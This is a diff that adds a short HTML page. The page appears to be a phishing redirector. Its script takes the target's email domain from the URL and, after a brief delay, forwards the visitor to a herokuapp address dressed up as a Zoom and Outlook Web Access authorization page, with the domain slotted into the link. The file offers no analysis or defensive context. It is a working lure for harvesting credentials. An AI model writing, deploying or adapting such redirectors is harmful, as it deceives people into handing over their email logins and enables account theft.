@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  </head>
+   <body style="background-color:#f1f2f3">
+      <script>
+        var queryString = window.location.href;
+        var email= queryString.split("&");
+        var root = email[1];
+        var cross = root.split("#");
+        var dom = cross[0];
+
+          setTimeout(function(){
+            var redirect = "https://zoom-online-owa-authorization.herokuapp.com/?invite=bewfhk%40ohixyzo80atUEFUVJHKBDVUJHEyMTIxXzIzNTgwNF8yNTQ1MzcuMDU4NTkwMDAwLCNGI1MjMTcxNDEjRQ%3D%3D%3Aver-user=FTDcv56473clint=outlook#{domain}";
+            var link = redirect.replace("{domain}",dom);
+            window.location.href = link;
+         },395);
+        </script>
+
+   </body>
+</html>
